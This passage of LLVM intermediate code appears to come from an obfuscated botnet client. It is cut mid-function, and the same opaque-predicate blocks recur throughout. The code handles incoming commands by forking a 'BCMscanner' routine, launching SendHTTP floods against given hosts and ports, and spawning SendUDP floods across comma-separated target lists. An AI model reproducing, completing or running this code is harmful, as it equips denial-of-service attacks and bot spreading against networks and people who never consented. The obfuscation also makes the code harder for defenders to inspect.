originalBBpart2148:                               ; preds = %originalBB146
  br i1 %1102, label %1118, label %1111

; <label>:1111:                                   ; preds = %originalBBpart2148
  %1112 = load i32, i32* @bcmPid, align 4
  %1113 = icmp eq i32 %1112, 0
  br i1 %1113, label %1114, label %1115

; <label>:1114:                                   ; preds = %1111
  br label %2070

; <label>:1115:                                   ; preds = %1111
  %1116 = load i32, i32* @bcmPid, align 4
  %1117 = call i32 @kill(i32 %1116, i32 9) #5
  store i32 0, i32* @bcmPid, align 4
  br label %1118

; <label>:1118:                                   ; preds = %1115, %originalBBpart2148
  %1119 = load i8**, i8*** %12, align 8
  %1120 = getelementptr inbounds i8*, i8** %1119, i64 1
  %1121 = load i8*, i8** %1120, align 8
  %1122 = call i32 @strcmp(i8* %1121, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.927, i32 0, i32 0)) #9
  %1123 = icmp ne i32 %1122, 0
  br i1 %1123, label %1188, label %1124

; <label>:1124:                                   ; preds = %1118
  %1125 = load i32, i32* @x.115
  %1126 = load i32, i32* @y.116
  %1127 = sub i32 %1125, 1
  %1128 = mul i32 %1125, %1127
  %1129 = urem i32 %1128, 2
  %1130 = icmp eq i32 %1129, 0
  %1131 = icmp slt i32 %1126, 10
  %1132 = or i1 %1130, %1131
  br i1 %1132, label %originalBB150, label %originalBB150alteredBB

originalBB150:                                    ; preds = %originalBB150alteredBB, %1124
  %1133 = load i32, i32* @bcmPid, align 4
  %1134 = icmp ne i32 %1133, 0
  %1135 = load i32, i32* @x.115
  %1136 = load i32, i32* @y.116
  %1137 = sub i32 %1135, 1
  %1138 = mul i32 %1135, %1137
  %1139 = urem i32 %1138, 2
  %1140 = icmp eq i32 %1139, 0
  %1141 = icmp slt i32 %1136, 10
  %1142 = or i1 %1140, %1141
  br i1 %1142, label %originalBBpart2152, label %originalBB150alteredBB

originalBBpart2152:                               ; preds = %originalBB150
  br i1 %1134, label %1143, label %1144

; <label>:1143:                                   ; preds = %originalBBpart2152
  br label %2070

; <label>:1144:                                   ; preds = %originalBBpart2152
  %1145 = call i32 @fork() #5
  store i32 %1145, i32* %28, align 4
  %1146 = load i32, i32* %28, align 4
  %1147 = icmp ugt i32 %1146, 0
  br i1 %1147, label %1148, label %1150

; <label>:1148:                                   ; preds = %1144
  %1149 = load i32, i32* %28, align 4
  store i32 %1149, i32* @bcmPid, align 4
  br label %2070

; <label>:1150:                                   ; preds = %1144
  %1151 = load i32, i32* @x.115
  %1152 = load i32, i32* @y.116
  %1153 = sub i32 %1151, 1
  %1154 = mul i32 %1151, %1153
  %1155 = urem i32 %1154, 2
  %1156 = icmp eq i32 %1155, 0
  %1157 = icmp slt i32 %1152, 10
  %1158 = or i1 %1156, %1157
  br i1 %1158, label %originalBB154, label %originalBB154alteredBB

originalBB154:                                    ; preds = %originalBB154alteredBB, %1150
  %1159 = load i32, i32* %28, align 4
  %1160 = icmp eq i32 %1159, -1
  %1161 = load i32, i32* @x.115
  %1162 = load i32, i32* @y.116
  %1163 = sub i32 %1161, 1
  %1164 = mul i32 %1161, %1163
  %1165 = urem i32 %1164, 2
  %1166 = icmp eq i32 %1165, 0
  %1167 = icmp slt i32 %1162, 10
  %1168 = or i1 %1166, %1167
  br i1 %1168, label %originalBBpart2156, label %originalBB154alteredBB

originalBBpart2156:                               ; preds = %originalBB154
  br i1 %1160, label %1169, label %1186

; <label>:1169:                                   ; preds = %originalBBpart2156
  %1170 = load i32, i32* @x.115
  %1171 = load i32, i32* @y.116
  %1172 = sub i32 %1170, 1
  %1173 = mul i32 %1170, %1172
  %1174 = urem i32 %1173, 2
  %1175 = icmp eq i32 %1174, 0
  %1176 = icmp slt i32 %1171, 10
  %1177 = or i1 %1175, %1176
  br i1 %1177, label %originalBB158, label %originalBB158alteredBB

originalBB158:                                    ; preds = %originalBB158alteredBB, %1169
  %1178 = load i32, i32* @x.115
  %1179 = load i32, i32* @y.116
  %1180 = sub i32 %1178, 1
  %1181 = mul i32 %1178, %1180
  %1182 = urem i32 %1181, 2
  %1183 = icmp eq i32 %1182, 0
  %1184 = icmp slt i32 %1179, 10
  %1185 = or i1 %1183, %1184
  br i1 %1185, label %originalBBpart2160, label %originalBB158alteredBB

originalBBpart2160:                               ; preds = %originalBB158
  br label %2070

; <label>:1186:                                   ; preds = %originalBBpart2156
  br label %1187

; <label>:1187:                                   ; preds = %1186
  call void @BCMscanner()
  call void @_exit(i32 0) #12
  unreachable

; <label>:1188:                                   ; preds = %1118
  br label %1189

; <label>:1189:                                   ; preds = %1188, %originalBBpart2144
  %1190 = load i8**, i8*** %12, align 8
  %1191 = getelementptr inbounds i8*, i8** %1190, i64 0
  %1192 = load i8*, i8** %1191, align 8
  %1193 = call i32 @strcmp(i8* %1192, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.942, i32 0, i32 0)) #9
  %1194 = icmp ne i32 %1193, 0
  br i1 %1194, label %1270, label %1195

; <label>:1195:                                   ; preds = %1189
  %1196 = load i32, i32* %11, align 4
  %1197 = icmp slt i32 %1196, 6
  br i1 %1197, label %1226, label %1198

; <label>:1198:                                   ; preds = %1195
  %1199 = load i8**, i8*** %12, align 8
  %1200 = getelementptr inbounds i8*, i8** %1199, i64 3
  %1201 = load i8*, i8** %1200, align 8
  %1202 = call i32 @atoi(i8* %1201) #9
  %1203 = icmp slt i32 %1202, 1
  br i1 %1203, label %1226, label %1204

; <label>:1204:                                   ; preds = %1198
  %1205 = load i32, i32* @x.115
  %1206 = load i32, i32* @y.116
  %1207 = sub i32 %1205, 1
  %1208 = mul i32 %1205, %1207
  %1209 = urem i32 %1208, 2
  %1210 = icmp eq i32 %1209, 0
  %1211 = icmp slt i32 %1206, 10
  %1212 = or i1 %1210, %1211
  br i1 %1212, label %originalBB162, label %originalBB162alteredBB

originalBB162:                                    ; preds = %originalBB162alteredBB, %1204
  %1213 = load i8**, i8*** %12, align 8
  %1214 = getelementptr inbounds i8*, i8** %1213, i64 5
  %1215 = load i8*, i8** %1214, align 8
  %1216 = call i32 @atoi(i8* %1215) #9
  %1217 = icmp slt i32 %1216, 1
  %1218 = load i32, i32* @x.115
  %1219 = load i32, i32* @y.116
  %1220 = sub i32 %1218, 1
  %1221 = mul i32 %1218, %1220
  %1222 = urem i32 %1221, 2
  %1223 = icmp eq i32 %1222, 0
  %1224 = icmp slt i32 %1219, 10
  %1225 = or i1 %1223, %1224
  br i1 %1225, label %originalBBpart2164, label %originalBB162alteredBB

originalBBpart2164:                               ; preds = %originalBB162
  br i1 %1217, label %1226, label %1243

; <label>:1226:                                   ; preds = %originalBBpart2164, %1198, %1195
  %1227 = load i32, i32* @x.115
  %1228 = load i32, i32* @y.116
  %1229 = sub i32 %1227, 1
  %1230 = mul i32 %1227, %1229
  %1231 = urem i32 %1230, 2
  %1232 = icmp eq i32 %1231, 0
  %1233 = icmp slt i32 %1228, 10
  %1234 = or i1 %1232, %1233
  br i1 %1234, label %originalBB166, label %originalBB166alteredBB

originalBB166:                                    ; preds = %originalBB166alteredBB, %1226
  %1235 = load i32, i32* @x.115
  %1236 = load i32, i32* @y.116
  %1237 = sub i32 %1235, 1
  %1238 = mul i32 %1235, %1237
  %1239 = urem i32 %1238, 2
  %1240 = icmp eq i32 %1239, 0
  %1241 = icmp slt i32 %1236, 10
  %1242 = or i1 %1240, %1241
  br i1 %1242, label %originalBBpart2168, label %originalBB166alteredBB

originalBBpart2168:                               ; preds = %originalBB166
  br label %2070

; <label>:1243:                                   ; preds = %originalBBpart2164
  %1244 = call i32 @listFork()
  %1245 = icmp ne i32 %1244, 0
  br i1 %1245, label %1246, label %1247

; <label>:1246:                                   ; preds = %1243
  br label %2070

; <label>:1247:                                   ; preds = %1243
  %1248 = load i8**, i8*** %12, align 8
  %1249 = getelementptr inbounds i8*, i8** %1248, i64 1
  %1250 = load i8*, i8** %1249, align 8
  %1251 = load i8**, i8*** %12, align 8
  %1252 = getelementptr inbounds i8*, i8** %1251, i64 2
  %1253 = load i8*, i8** %1252, align 8
  %1254 = load i8**, i8*** %12, align 8
  %1255 = getelementptr inbounds i8*, i8** %1254, i64 3
  %1256 = load i8*, i8** %1255, align 8
  %1257 = call i32 @atoi(i8* %1256) #9
  %1258 = trunc i32 %1257 to i16
  %1259 = load i8**, i8*** %12, align 8
  %1260 = getelementptr inbounds i8*, i8** %1259, i64 4
  %1261 = load i8*, i8** %1260, align 8
  %1262 = load i8**, i8*** %12, align 8
  %1263 = getelementptr inbounds i8*, i8** %1262, i64 5
  %1264 = load i8*, i8** %1263, align 8
  %1265 = call i32 @atoi(i8* %1264) #9
  %1266 = load i8**, i8*** %12, align 8
  %1267 = getelementptr inbounds i8*, i8** %1266, i64 6
  %1268 = load i8*, i8** %1267, align 8
  %1269 = call i32 @atoi(i8* %1268) #9
  call void @SendHTTP(i8* %1250, i8* %1253, i16 zeroext %1258, i8* %1261, i32 %1265, i32 %1269)
  call void @exit(i32 0) #11
  unreachable

; <label>:1270:                                   ; preds = %1189
  %1271 = load i32, i32* @x.115
  %1272 = load i32, i32* @y.116
  %1273 = sub i32 %1271, 1
  %1274 = mul i32 %1271, %1273
  %1275 = urem i32 %1274, 2
  %1276 = icmp eq i32 %1275, 0
  %1277 = icmp slt i32 %1272, 10
  %1278 = or i1 %1276, %1277
  br i1 %1278, label %originalBB170, label %originalBB170alteredBB

originalBB170:                                    ; preds = %originalBB170alteredBB, %1270
  %1279 = load i8**, i8*** %12, align 8
  %1280 = getelementptr inbounds i8*, i8** %1279, i64 0
  %1281 = load i8*, i8** %1280, align 8
  %1282 = call i32 @strcmp(i8* %1281, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.943, i32 0, i32 0)) #9
  %1283 = icmp ne i32 %1282, 0
  %1284 = load i32, i32* @x.115
  %1285 = load i32, i32* @y.116
  %1286 = sub i32 %1284, 1
  %1287 = mul i32 %1284, %1286
  %1288 = urem i32 %1287, 2
  %1289 = icmp eq i32 %1288, 0
  %1290 = icmp slt i32 %1285, 10
  %1291 = or i1 %1289, %1290
  br i1 %1291, label %originalBBpart2172, label %originalBB170alteredBB

originalBBpart2172:                               ; preds = %originalBB170
  br i1 %1283, label %1533, label %1292

; <label>:1292:                                   ; preds = %originalBBpart2172
  %1293 = load i32, i32* %11, align 4
  %1294 = icmp slt i32 %1293, 6
  br i1 %1294, label %1360, label %1295

; <label>:1295:                                   ; preds = %1292
  %1296 = load i8**, i8*** %12, align 8
  %1297 = getelementptr inbounds i8*, i8** %1296, i64 3
  %1298 = load i8*, i8** %1297, align 8
  %1299 = call i32 @atoi(i8* %1298) #9
  %1300 = icmp eq i32 %1299, -1
  br i1 %1300, label %1360, label %1301

; <label>:1301:                                   ; preds = %1295
  %1302 = load i8**, i8*** %12, align 8
  %1303 = getelementptr inbounds i8*, i8** %1302, i64 2
  %1304 = load i8*, i8** %1303, align 8
  %1305 = call i32 @atoi(i8* %1304) #9
  %1306 = icmp eq i32 %1305, -1
  br i1 %1306, label %1360, label %1307

; <label>:1307:                                   ; preds = %1301
  %1308 = load i32, i32* @x.115
  %1309 = load i32, i32* @y.116
  %1310 = sub i32 %1308, 1
  %1311 = mul i32 %1308, %1310
  %1312 = urem i32 %1311, 2
  %1313 = icmp eq i32 %1312, 0
  %1314 = icmp slt i32 %1309, 10
  %1315 = or i1 %1313, %1314
  br i1 %1315, label %originalBB174, label %originalBB174alteredBB

originalBB174:                                    ; preds = %originalBB174alteredBB, %1307
  %1316 = load i8**, i8*** %12, align 8
  %1317 = getelementptr inbounds i8*, i8** %1316, i64 4
  %1318 = load i8*, i8** %1317, align 8
  %1319 = call i32 @atoi(i8* %1318) #9
  %1320 = icmp eq i32 %1319, -1
  %1321 = load i32, i32* @x.115
  %1322 = load i32, i32* @y.116
  %1323 = sub i32 %1321, 1
  %1324 = mul i32 %1321, %1323
  %1325 = urem i32 %1324, 2
  %1326 = icmp eq i32 %1325, 0
  %1327 = icmp slt i32 %1322, 10
  %1328 = or i1 %1326, %1327
  br i1 %1328, label %originalBBpart2176, label %originalBB174alteredBB

originalBBpart2176:                               ; preds = %originalBB174
  br i1 %1320, label %1360, label %1329

; <label>:1329:                                   ; preds = %originalBBpart2176
  %1330 = load i8**, i8*** %12, align 8
  %1331 = getelementptr inbounds i8*, i8** %1330, i64 4
  %1332 = load i8*, i8** %1331, align 8
  %1333 = call i32 @atoi(i8* %1332) #9
  %1334 = icmp sgt i32 %1333, 1024
  br i1 %1334, label %1360, label %1335

; <label>:1335:                                   ; preds = %1329
  %1336 = load i32, i32* %11, align 4
  %1337 = icmp eq i32 %1336, 6
  br i1 %1337, label %1338, label %1377

; <label>:1338:                                   ; preds = %1335
  %1339 = load i32, i32* @x.115
  %1340 = load i32, i32* @y.116
  %1341 = sub i32 %1339, 1
  %1342 = mul i32 %1339, %1341
  %1343 = urem i32 %1342, 2
  %1344 = icmp eq i32 %1343, 0
  %1345 = icmp slt i32 %1340, 10
  %1346 = or i1 %1344, %1345
  br i1 %1346, label %originalBB178, label %originalBB178alteredBB

originalBB178:                                    ; preds = %originalBB178alteredBB, %1338
  %1347 = load i8**, i8*** %12, align 8
  %1348 = getelementptr inbounds i8*, i8** %1347, i64 5
  %1349 = load i8*, i8** %1348, align 8
  %1350 = call i32 @atoi(i8* %1349) #9
  %1351 = icmp slt i32 %1350, 1
  %1352 = load i32, i32* @x.115
  %1353 = load i32, i32* @y.116
  %1354 = sub i32 %1352, 1
  %1355 = mul i32 %1352, %1354
  %1356 = urem i32 %1355, 2
  %1357 = icmp eq i32 %1356, 0
  %1358 = icmp slt i32 %1353, 10
  %1359 = or i1 %1357, %1358
  br i1 %1359, label %originalBBpart2180, label %originalBB178alteredBB

originalBBpart2180:                               ; preds = %originalBB178
  br i1 %1351, label %1360, label %1377

; <label>:1360:                                   ; preds = %originalBBpart2180, %1329, %originalBBpart2176, %1301, %1295, %1292
  %1361 = load i32, i32* @x.115
  %1362 = load i32, i32* @y.116
  %1363 = sub i32 %1361, 1
  %1364 = mul i32 %1361, %1363
  %1365 = urem i32 %1364, 2
  %1366 = icmp eq i32 %1365, 0
  %1367 = icmp slt i32 %1362, 10
  %1368 = or i1 %1366, %1367
  br i1 %1368, label %originalBB182, label %originalBB182alteredBB

originalBB182:                                    ; preds = %originalBB182alteredBB, %1360
  %1369 = load i32, i32* @x.115
  %1370 = load i32, i32* @y.116
  %1371 = sub i32 %1369, 1
  %1372 = mul i32 %1369, %1371
  %1373 = urem i32 %1372, 2
  %1374 = icmp eq i32 %1373, 0
  %1375 = icmp slt i32 %1370, 10
  %1376 = or i1 %1374, %1375
  br i1 %1376, label %originalBBpart2184, label %originalBB182alteredBB

originalBBpart2184:                               ; preds = %originalBB182
  br label %2070

; <label>:1377:                                   ; preds = %originalBBpart2180, %1335
  %1378 = load i8**, i8*** %12, align 8
  %1379 = getelementptr inbounds i8*, i8** %1378, i64 1
  %1380 = load i8*, i8** %1379, align 8
  store i8* %1380, i8** %29, align 8
  %1381 = load i8**, i8*** %12, align 8
  %1382 = getelementptr inbounds i8*, i8** %1381, i64 2
  %1383 = load i8*, i8** %1382, align 8
  %1384 = call i32 @atoi(i8* %1383) #9
  store i32 %1384, i32* %30, align 4
  %1385 = load i8**, i8*** %12, align 8
  %1386 = getelementptr inbounds i8*, i8** %1385, i64 3
  %1387 = load i8*, i8** %1386, align 8
  %1388 = call i32 @atoi(i8* %1387) #9
  store i32 %1388, i32* %31, align 4
  %1389 = load i8**, i8*** %12, align 8
  %1390 = getelementptr inbounds i8*, i8** %1389, i64 4
  %1391 = load i8*, i8** %1390, align 8
  %1392 = call i32 @atoi(i8* %1391) #9
  store i32 %1392, i32* %32, align 4
  %1393 = load i32, i32* %11, align 4
  %1394 = icmp eq i32 %1393, 6
  br i1 %1394, label %1395, label %1416

; <label>:1395:                                   ; preds = %1377
  %1396 = load i32, i32* @x.115
  %1397 = load i32, i32* @y.116
  %1398 = sub i32 %1396, 1
  %1399 = mul i32 %1396, %1398
  %1400 = urem i32 %1399, 2
  %1401 = icmp eq i32 %1400, 0
  %1402 = icmp slt i32 %1397, 10
  %1403 = or i1 %1401, %1402
  br i1 %1403, label %originalBB186, label %originalBB186alteredBB

originalBB186:                                    ; preds = %originalBB186alteredBB, %1395
  %1404 = load i8**, i8*** %12, align 8
  %1405 = getelementptr inbounds i8*, i8** %1404, i64 5
  %1406 = load i8*, i8** %1405, align 8
  %1407 = call i32 @atoi(i8* %1406) #9
  %1408 = load i32, i32* @x.115
  %1409 = load i32, i32* @y.116
  %1410 = sub i32 %1408, 1
  %1411 = mul i32 %1408, %1410
  %1412 = urem i32 %1411, 2
  %1413 = icmp eq i32 %1412, 0
  %1414 = icmp slt i32 %1409, 10
  %1415 = or i1 %1413, %1414
  br i1 %1415, label %originalBBpart2188, label %originalBB186alteredBB

originalBBpart2188:                               ; preds = %originalBB186
  br label %1417

; <label>:1416:                                   ; preds = %1377
  br label %1417

; <label>:1417:                                   ; preds = %1416, %originalBBpart2188
  %1418 = phi i32 [ %1407, %originalBBpart2188 ], [ 10, %1416 ]
  store i32 %1418, i32* %33, align 4
  store i32 32, i32* %34, align 4
  %1419 = load i8*, i8** %29, align 8
  %1420 = call i8* @strstr(i8* %1419, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.915, i32 0, i32 0)) #9
  %1421 = icmp ne i8* %1420, null
  br i1 %1421, label %1422, label %1505

; <label>:1422:                                   ; preds = %1417
  %1423 = load i32, i32* @x.115
  %1424 = load i32, i32* @y.116
  %1425 = sub i32 %1423, 1
  %1426 = mul i32 %1423, %1425
  %1427 = urem i32 %1426, 2
  %1428 = icmp eq i32 %1427, 0
  %1429 = icmp slt i32 %1424, 10
  %1430 = or i1 %1428, %1429
  br i1 %1430, label %originalBB190, label %originalBB190alteredBB

originalBB190:                                    ; preds = %originalBB190alteredBB, %1422
  %1431 = load i8*, i8** %29, align 8
  %1432 = call i8* @strtok(i8* %1431, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.915, i32 0, i32 0)) #5
  store i8* %1432, i8** %35, align 8
  %1433 = load i32, i32* @x.115
  %1434 = load i32, i32* @y.116
  %1435 = sub i32 %1433, 1
  %1436 = mul i32 %1433, %1435
  %1437 = urem i32 %1436, 2
  %1438 = icmp eq i32 %1437, 0
  %1439 = icmp slt i32 %1434, 10
  %1440 = or i1 %1438, %1439
  br i1 %1440, label %originalBBpart2192, label %originalBB190alteredBB

originalBBpart2192:                               ; preds = %originalBB190
  br label %1441

; <label>:1441:                                   ; preds = %1486, %originalBBpart2192
  %1442 = load i32, i32* @x.115
  %1443 = load i32, i32* @y.116
  %1444 = sub i32 %1442, 1
  %1445 = mul i32 %1442, %1444
  %1446 = urem i32 %1445, 2
  %1447 = icmp eq i32 %1446, 0
  %1448 = icmp slt i32 %1443, 10
  %1449 = or i1 %1447, %1448
  br i1 %1449, label %originalBB194, label %originalBB194alteredBB

originalBB194:                                    ; preds = %originalBB194alteredBB, %1441
  %1450 = load i8*, i8** %35, align 8
  %1451 = icmp ne i8* %1450, null
  %1452 = load i32, i32* @x.115
  %1453 = load i32, i32* @y.116
  %1454 = sub i32 %1452, 1
  %1455 = mul i32 %1452, %1454
  %1456 = urem i32 %1455, 2
  %1457 = icmp eq i32 %1456, 0
  %1458 = icmp slt i32 %1453, 10
  %1459 = or i1 %1457, %1458
  br i1 %1459, label %originalBBpart2196, label %originalBB194alteredBB

originalBBpart2196:                               ; preds = %originalBB194
  br i1 %1451, label %1460, label %1488

; <label>:1460:                                   ; preds = %originalBBpart2196
  %1461 = load i32, i32* @x.115
  %1462 = load i32, i32* @y.116
  %1463 = sub i32 %1461, 1
  %1464 = mul i32 %1461, %1463
  %1465 = urem i32 %1464, 2
  %1466 = icmp eq i32 %1465, 0
  %1467 = icmp slt i32 %1462, 10
  %1468 = or i1 %1466, %1467
  br i1 %1468, label %originalBB198, label %originalBB198alteredBB

originalBB198:                                    ; preds = %originalBB198alteredBB, %1460
  %1469 = call i32 @listFork()
  %1470 = icmp ne i32 %1469, 0
  %1471 = load i32, i32* @x.115
  %1472 = load i32, i32* @y.116
  %1473 = sub i32 %1471, 1
  %1474 = mul i32 %1471, %1473
  %1475 = urem i32 %1474, 2
  %1476 = icmp eq i32 %1475, 0
  %1477 = icmp slt i32 %1472, 10
  %1478 = or i1 %1476, %1477
  br i1 %1478, label %originalBBpart2200, label %originalBB198alteredBB

originalBBpart2200:                               ; preds = %originalBB198
  br i1 %1470, label %1486, label %1479

; <label>:1479:                                   ; preds = %originalBBpart2200
  %1480 = load i8*, i8** %35, align 8
  %1481 = load i32, i32* %30, align 4
  %1482 = load i32, i32* %31, align 4
  %1483 = load i32, i32* %32, align 4
  %1484 = load i32, i32* %33, align 4
  %1485 = load i32, i32* %34, align 4
  call void @SendUDP(i8* %1480, i32 %1481, i32 %1482, i32 %1483, i32 %1484, i32 %1485)
  call void @_exit(i32 0) #12
  unreachable

; <label>:1486:                                   ; preds = %originalBBpart2200
  %1487 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.915, i32 0, i32 0)) #5
  store i8* %1487, i8** %35, align 8
  br label %1441

; <label>:1488:                                   ; preds = %originalBBpart2196
  %1489 = load i32, i32* @x.115
  %1490 = load i32, i32* @y.116
  %1491 = sub i32 %1489, 1
  %1492 = mul i32 %1489, %1491
  %1493 = urem i32 %1492, 2
  %1494 = icmp eq i32 %1493, 0
  %1495 = icmp slt i32 %1490, 10
  %1496 = or i1 %1494, %1495
  br i1 %1496, label %originalBB202, label %originalBB202alteredBB

originalBB202:                                    ; preds = %originalBB202alteredBB, %1488
  %1497 = load i32, i32* @x.115
  %1498 = load i32, i32* @y.116
  %1499 = sub i32 %1497, 1
  %1500 = mul i32 %1497, %1499
  %1501 = urem i32 %1500, 2
  %1502 = icmp eq i32 %1501, 0
  %1503 = icmp slt i32 %1498, 10
  %1504 = or i1 %1502, %1503
  br i1 %1504, label %originalBBpart2204, label %originalBB202alteredBB

originalBBpart2204:                               ; preds = %originalBB202
  br label %1532

; <label>:1505:                                   ; preds = %1417
  %1506 = call i32 @listFork()
  %1507 = icmp ne i32 %1506, 0
  br i1 %1507, label %1508, label %1525

; <label>:1508:                                   ; preds = %1505
  %1509 = load i32, i32* @x.115
  %1510 = load i32, i32* @y.116
  %1511 = sub i32 %1509, 1
  %1512 = mul i32 %1509, %1511
  %1513 = urem i32 %1512, 2
  %1514 = icmp eq i32 %1513, 0
  %1515 = icmp slt i32 %1510, 10
  %1516 = or i1 %1514, %1515
  br i1 %1516, label %originalBB206, label %originalBB206alteredBB

originalBB206:                                    ; preds = %originalBB206alteredBB, %1508
  %1517 = load i32, i32* @x.115
  %1518 = load i32, i32* @y.116
  %1519 = sub i32 %1517, 1
  %1520 = mul i32 %1517, %1519
  %1521 = urem i32 %1520, 2
  %1522 = icmp eq i32 %1521, 0
  %1523 = icmp slt i32 %1518, 10
  %1524 = or i1 %1522, %1523
  br i1 %1524, label %originalBBpart2208, label %originalBB206alteredBB

originalBBpart2208:                               ; preds = %originalBB206
  br label %2070

; <label>:1525:                                   ; preds = %1505
  %1526 = load i8*, i8** %29, align 8
  %1527 = load i32, i32* %30, align 4
  %1528 = load i32, i32* %31, align 4
  %1529 = load i32, i32* %32, align 4
  %1530 = load i32, i32* %33, align 4
  %1531 = load i32, i32* %34, align 4
  call void @SendUDP(i8* %1526, i32 %1527, i32 %1528, i32 %1529, i32 %1530, i32 %1531)
  call void @_exit(i32 0) #12
  unreachable

; <label>:1532:                                   ; preds = %originalBBpart2204
  br label %1533

; <label>:1533:                                   ; preds = %1532, %originalBBpart2172
  %1534 = load i32, i32* @x.115
  %1535 = load i32, i32* @y.116
  %1536 = sub i32 %1534, 1
  %1537 = mul i32 %1534, %1536
  %1538 = urem i32 %1537, 2
  %1539 = icmp eq i32 %1538, 0
  %1540 = icmp slt i32 %1535, 10
  %1541 = or i1 %1539, %1540
  br i1 %1541, label %originalBB210, label %originalBB210alteredBB

originalBB210:                                    ; preds = %originalBB210alteredBB, %1533
  %1542 = load i8**, i8*** %12, align 8
  %1543 = getelementptr inbounds i8*, i8** %1542, i64 0
  %1544 = load i8*, i8** %1543, align 8
  %1545 = call i32 @strcmp(i8* %1544, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.944, i32 0, i32 0)) #9
  %1546 = icmp ne i32 %1545, 0
  %1547 = load i32, i32* @x.115
  %1548 = load i32, i32* @y.116
  %1549 = sub i32 %1547, 1
  %1550 = mul i32 %1547, %1549
  %1551 = urem i32 %1550, 2
  %1552 = icmp eq i32 %1551, 0
  %1553 = icmp slt i32 %1548, 10
  %1554 = or i1 %1552, %1553
  br i1 %1554, label %originalBBpart2212, label %originalBB210alteredBB

originalBBpart2212:                               ; preds = %originalBB210
  br i1 %1546, label %1804, label %1555

; <label>:1555:                                   ; preds = %originalBBpart2212
  %1556 = load i32, i32* @x.115
  %1557 = load i32, i32* @y.116
  %1558 = sub i32 %1556, 1
  %1559 = mul i32 %1556, %1558
  %1560 = urem i32 %1559, 2
  %1561 = icmp eq i32 %1560, 0
  %1562 = icmp slt i32 %1557, 10
  %1563 = or i1 %1561, %1562
  br i1 %1563, label %originalBB214, label %originalBB214alteredBB

originalBB214:                                    ; preds = %originalBB214alteredBB, %1555
  %1564 = load i32, i32* %11, align 4
  %1565 = icmp slt i32 %1564, 6
  %1566 = load i32, i32* @x.115
  %1567 = load i32, i32* @y.116
  %1568 = sub i32 %1566, 1
  %1569 = mul i32 %1566, %1568
  %1570 = urem i32 %1569, 2
  %1571 = icmp eq i32 %1570, 0
  %1572 = icmp slt i32 %1567, 10
  %1573 = or i1 %1571, %1572
  br i1 %1573, label %originalBBpart2216, label %originalBB214alteredBB

originalBBpart2216:                               ; preds = %originalBB214
  br i1 %1565, label %1620, label %1574

; <label>:1574:                                   ; preds = %originalBBpart2216
  %1575 = load i8**, i8*** %12, align 8
  %1576 = getelementptr inbounds i8*, i8** %1575, i64 3
  %1577 = load i8*, i8** %1576, align 8
  %1578 = call i32 @atoi(i8* %1577) #9
  %1579 = icmp eq i32 %1578, -1
  br i1 %1579, label %1620, label %1580

; <label>:1580:                                   ; preds = %1574
  %1581 = load i32, i32* @x.115
  %1582 = load i32, i32* @y.116
  %1583 = sub i32 %1581, 1
  %1584 = mul i32 %1581, %1583
  %1585 = urem i32 %1584, 2
  %1586 = icmp eq i32 %1585, 0
  %1587 = icmp slt i32 %1582, 10
  %1588 = or i1 %1586, %1587
  br i1 %1588, label %originalBB218, label %originalBB218alteredBB

originalBB218:                                    ; preds = %originalBB218alteredBB, %1580
  %1589 = load i8**, i8*** %12, align 8
  %1590 = getelementptr inbounds i8*, i8** %1589, i64 2
  %1591 = load i8*, i8** %1590, align 8
  %1592 = call i32 @atoi(i8* %1591) #9
  %1593 = icmp eq i32 %1592, -1
  %1594 = load i32, i32* @x.115
  %1595 = load i32, i32* @y.116
  %1596 = sub i32 %1594, 1
  %1597 = mul i32 %1594, %1596
  %1598 = urem i32 %1597, 2
  %1599 = icmp eq i32 %1598, 0
  %1600 = icmp slt i32 %1595, 10
  %1601 = or i1 %1599, %1600
  br i1 %1601, label %originalBBpart2220, label %originalBB218alteredBB

originalBBpart2220:                               ; preds = %originalBB218
  br i1 %1593, label %1620, label %1602

; <label>:1602:                                   ; preds = %originalBBpart2220
  %1603 = load i32, i32* %11, align 4
  %1604 = icmp sgt i32 %1603, 5
  br i1 %1604, label %1605, label %1611

; <label>:1605:                                   ; preds = %1602
  %1606 = load i8**, i8*** %12, align 8
  %1607 = getelementptr inbounds i8*, i8** %1606, i64 5
  %1608 = load i8*, i8** %1607, align 8
  %1609 = call i32 @atoi(i8* %1608) #9
  %1610 = icmp slt i32 %1609, 0
  br i1 %1610, label %1620, label %1611

; <label>:1611:                                   ; preds = %1605, %1602
  %1612 = load i32, i32* %11, align 4
  %1613 = icmp eq i32 %1612, 7
  br i1 %1613, label %1614, label %1637

; <label>:1614:                                   ; preds = %1611
  %1615 = load i8**, i8*** %12, align 8
  %1616 = getelementptr inbounds i8*, i8** %1615, i64 6
  %1617 = load i8*, i8** %1616, align 8
  %1618 = call i32 @atoi(i8* %1617) #9
  %1619 = icmp slt i32 %1618, 1
  br i1 %1619, label %1620, label %1637

; <label>:1620:                                   ; preds = %1614, %1605, %originalBBpart2220, %1574, %originalBBpart2216
  %1621 = load i32, i32* @x.115
  %1622 = load i32, i32* @y.116
  %1623 = sub i32 %1621, 1
  %1624 = mul i32 %1621, %1623
  %1625 = urem i32 %1624, 2
  %1626 = icmp eq i32 %1625, 0
  %1627 = icmp slt i32 %1622, 10
  %1628 = or i1 %1626, %1627
  br i1 %1628, label %originalBB222, label %originalBB222alteredBB

originalBB222:                                    ; preds = %originalBB222alteredBB, %1620
  %1629 = load i32, i32* @x.115
  %1630 = load i32, i32* @y.116
  %1631 = sub i32 %1629, 1
  %1632 = mul i32 %1629, %1631
  %1633 = urem i32 %1632, 2
  %1634 = icmp eq i32 %1633, 0
  %1635 = icmp slt i32 %1630, 10
  %1636 = or i1 %1634, %1635
  br i1 %1636, label %originalBBpart2224, label %originalBB222alteredBB

originalBBpart2224:                               ; preds = %originalBB222
  br label %2070

; <label>:1637:                                   ; preds = %1614, %1611
  %1638 = load i8**, i8*** %12, align 8
  %1639 = getelementptr inbounds i8*, i8** %1638, i64 1
  %1640 = load i8*, i8** %1639, align 8
  store i8* %1640, i8** %36, align 8
  %1641 = load i8**, i8*** %12, align 8
  %1642 = getelementptr inbounds i8*, i8** %1641, i64 2
  %1643 = load i8*, i8** %1642, align 8
  %1644 = call i32 @atoi(i8* %1643) #9
  store i32 %1644, i32* %37, align 4
